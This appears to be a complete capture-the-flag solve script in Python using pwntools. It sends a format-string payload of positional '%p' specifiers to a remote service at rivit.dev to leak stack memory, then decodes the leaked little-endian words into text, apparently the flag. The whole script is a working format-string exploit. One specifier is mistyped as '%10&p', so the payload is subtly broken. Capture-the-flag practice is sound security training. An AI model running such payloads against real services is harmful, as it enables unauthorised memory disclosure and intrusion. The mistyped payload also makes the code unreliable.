from pwn import *

def hex_leaks_to_string(leaks):
    result = ""
    for word in leaks:
        if not word.startswith("0x"):
            continue  # skip non-hex values

        try:
            # Remove 0x and pad to 16 hex digits (8 bytes)
            hex_str = word[2:].rjust(16, '0')
            # Reverse byte order for little-endian
            bytes_reversed = [hex_str[i:i+2] for i in range(0, 16, 2)][::-1]
            # Convert to characters
            result += ''.join(chr(int(b, 16)) for b in bytes_reversed)
        except ValueError:
            continue  # skip badly formatted entries
    return result

con = remote('rivit.dev', 10003)
payload = '%8$p %9$p %10&p %11$p %12$p %13$p'
con.sendlineafter('tag?', payload)
response = con.recvall().decode('utf-8')

print(f"leak: {hex_leaks_to_string(response.split())}")
